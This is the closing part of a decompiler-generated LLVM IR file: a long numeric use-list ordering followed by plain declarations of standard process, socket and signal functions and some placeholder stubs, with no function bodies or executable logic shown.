12, 2137, 2138, 13, 1550, 1551, 1500, 80, 1552, 340, 1553, 381, 2373, 382, 305, 2374, 2375, 2377, 2378, 380, 2229, 2231, 2232, 57, 245, 2233, 2230, 2227, 2228, 14, 1557, 1560, 1558, 1559, 246, 15, 2236, 2234, 2235, 247, 198, 1561, 1562, 1563, 1564, 2237, 2238, 383, 16, 2239, 199, 2240, 2241, 2242, 2243, 2244, 2245, 17, 18, 1893, 1894, 1895, 1896, 384, 19, 385, 2119, 2120, 1488, 1925, 1489, 2246, 2182, 2157, 1597, 2158, 2121, 2122, 200, 2123, 2127, 2128, 2129, 2130, 386, 2131, 2132, 2199, 201, 202, 2180, 387, 306, 2181, 2384, 203, 20, 204, 205, 1808, 1809, 207, 1810, 388, 206, 1811, 93, 21, 2187, 2188, 1812, 1813, 248, 22, 1814, 2124, 2125, 2126, 23, 2189, 2190, 2191, 24, 2390, 2391, 94, 208, 1815, 1816, 1817, 1818, 1819, 209, 2074, 1501, 2075, 124, 139, 2061, 2062, 2069, 2066, 2067, 2068, 249, 2070, 341, 2064, 2063, 250, 2065, 1565, 1566, 2076, 2077, 1567, 1568, 1820, 1821, 1822, 1823, 1824, 140, 1825, 1826, 1827, 1828, 1829, 210, 1830, 1832, 1833, 1831, 1834, 141, 1835, 1836, 211, 1837, 212, 290, 389, 1838, 1839, 213, 214, 1840, 1841, 1842, 1843, 1844, 1845, 307, 1846, 1847, 390, 1848, 308, 1850, 219, 1852, 216, 217, 1849, 215, 1851, 1853, 1855, 143, 1856, 1857, 220, 81, 82, 1858, 1859, 142, 391, 1860, 1861, 221, 392, 1862, 1863, 218, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 393, 1875, 111, 86, 1874, 1876, 1877, 1878, 25, 1533, 222, 1534, 122, 83, 99, 1854, 251, 1671, 1672, 1673, 1554, 26, 253, 223, 1556, 1555, 252, 309, 2386, 2080, 2081, 2082, 84, 2083, 2084, 224, 2085, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 164, 1879, 2098, 2038, 2039, 2040, 2041, 2042, 2043, 1502, 2247, 1966, 2376, 1569, 2183, 2205, 1570, 2213, 2379, 112, 2380, 2273, 2385, 2214, 2274, 1571, 2215, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 2155, 2216, 2217, 1582, 2381, 2382, 27, 2139, 144, 2140, 2141, 235, 234, 1503, 113, 114, 115, 116, 1505, 1504, 59, 58, 145, 2142, 2143, 2144, 2145, 2147, 2146, 28, 2248, 2249, 237, 236, 1506, 117, 118, 119, 120, 1508, 1507, 61, 60, 46, 85, 2250, 1509, 29, 2251, 2252, 121, 2253, 2254, 2255, 2256, 2257, 225, 1510, 1513, 1511, 1512, 2258, 1514, 297, 399, 1583, 400, 254, 401, 1584, 398, 44, 45, 402, 1585, 1586, 403, 411, 412, 534, 535, 62, 310, 394, 395, 396, 311, 397, 1587, 255, 146, 405, 406, 404, 1588, 1589, 1590, 1591, 1593, 276, 1592, 1594, 1595, 409, 410, 407, 408, 1596, 226, 312, 256, 1599, 413, 1598, 415, 416, 414, 417, 418, 1600, 1601, 342, 1602, 419, 1603, 420, 63, 100, 147, 148, 149, 150, 151, 436, 1614, 313, 314, 421, 315, 1615, 1616, 433, 228, 1617, 1620, 434, 1618, 435, 229, 1619, 260, 1621, 437, 1622, 430, 227, 1623, 1626, 431, 1624, 432, 230, 1625, 259, 1627, 438, 1628, 427, 1629, 1632, 428, 1630, 429, 1631, 258, 1633, 1634, 424, 1635, 1638, 425, 1636, 426, 1637, 257, 1639, 423, 439, 1640, 1641, 440, 1642, 1645, 441, 1643, 442, 1644, 261, 1646, 422, 443, 1647, 1648, 444, 1649, 1650, 445, 1651, 1652, 1653, 446, 1654, 1655, 1656, 447, 1657, 1658, 1659, 448, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 1670, 449, 450, 1674, 451, 231, 1880, 1881, 452, 454, 455, 453, 456, 457, 262, 1902, 298, 1903, 460, 1904, 64, 316, 1905, 1906, 1907, 1914, 459, 1908, 1909, 1910, 1911, 1912, 1913, 263, 1915, 461, 1916, 343, 1917, 1918, 458, 1919, 1920, 1921, 1922, 1923, 152, 1926, 463, 1927, 279, 65, 277, 278, 1928, 1929, 1930, 125, 344, 1931, 464, 1932, 462, 1933, 1934, 1935, 465, 1936, 282, 280, 66, 281, 1937, 1938, 466, 1939, 1940, 467, 1941, 1942, 1943, 317, 469, 470, 468, 471, 1515, 1516, 494, 1517, 1518, 1519, 1520, 493, 1521, 1522, 1523, 1524, 492, 1525, 1526, 1527, 1528, 489, 490, 472, 1529, 491, 488, 264, 265, 1530, 1531, 480, 1532, 481, 482, 483, 484, 485, 486, 487, 1490, 1967, 67, 96, 1968, 318, 1969, 473, 474, 475, 476, 477, 478, 479, 68, 87, 95, 495, 496, 1970, 497, 1971, 319, 320, 321, 2133, 345, 2134, 2135, 2136, 97, 153, 154, 69, 70, 498, 232, 2148, 322, 323, 324, 325, 505, 2149, 2151, 2152, 2153, 500, 2154, 501, 502, 503, 499, 266, 504, 2150, 346, 507, 508, 506, 326, 30, 510, 509, 511, 2156, 327, 328, 329, 330, 2159, 2160, 514, 512, 513, 267, 2161, 2162, 2163, 347, 283, 2167, 2168, 331, 2164, 2165, 515, 516, 517, 2166, 519, 520, 521, 522, 523, 518, 268, 524, 2169, 525, 71, 531, 72, 530, 526, 2184, 529, 270, 532, 527, 2185, 528, 269, 533, 73, 88, 2186, 332, 536, 537, 538, 2193, 539, 2192, 541, 542, 540, 543, 544, 2200, 2201, 348, 2202, 2203, 155, 2204, 74, 349, 2206, 271, 545, 546, 547, 548, 2208, 2209, 299, 2218, 2219, 549, 2220, 550, 2221, 2222, 551, 156, 552, 553, 554, 555, 556, 2269, 157, 75, 284, 272, 335, 336, 2259, 2260, 2261, 273, 333, 334, 337, 2262, 2263, 338, 2264, 2265, 275, 76, 158, 159, 274, 2267, 2268, 350, 160, 77, 557, 2266, 2270, 2271, 339, 2272, 1535, 1536, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 2392, 2393, 2394, 2395, 2396, 2397, 2398, 2399, 2400, 2401, 2402, 2403, 2404, 2405, 2406 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
